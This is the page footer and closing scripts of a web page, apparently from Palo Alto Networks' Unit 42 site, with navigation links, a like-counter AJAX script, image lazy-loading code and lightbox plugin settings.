                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p> 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
